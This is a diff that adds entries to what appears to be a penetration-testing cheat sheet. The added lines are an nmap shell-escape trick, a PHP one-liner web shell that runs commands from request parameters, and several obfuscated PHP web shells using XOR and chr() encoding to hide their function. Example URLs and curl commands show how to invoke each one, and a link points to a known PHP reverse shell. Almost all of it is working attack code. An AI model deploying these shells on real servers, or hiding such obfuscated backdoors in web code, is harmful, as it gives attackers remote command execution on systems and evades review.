@@ -120,3 +120,27 @@ ____
 
 ### TTY Spawn Shell > <a name="nmap_spawn_shell"></a>Nmap spawn shell
 ###### !sh
+
+____
+
+### PHP Reverse Shell > <a name="rce"></a>RCE
+###### <?php system($_GET["cmd"]);?
+
+### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
+###### <?=`$_GET[0]`?>
+* ###### Example: http://site.com/path/to/shell.php?0=command 
+###### <?=`$_POST[0]`?>
+* ###### Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
+###### <?=`{$_REQUEST['_']}`?>
+* ###### Example:
+* ###### http://site.com/path/to/shell.php?_=command
+* ###### curl -X POST http://site.com/path/to/shell.php -d "_=command" '
+###### <?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+* ###### Example: http://site.com/path/to/shell.php?0=command
+###### <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
+* ###### Example:
+* ###### http://target.com/path/to/shell.php?_=function&__=argument
+* ###### http://target.com/path/to/shell.php?_=system&__=ls
+
+### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
+###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
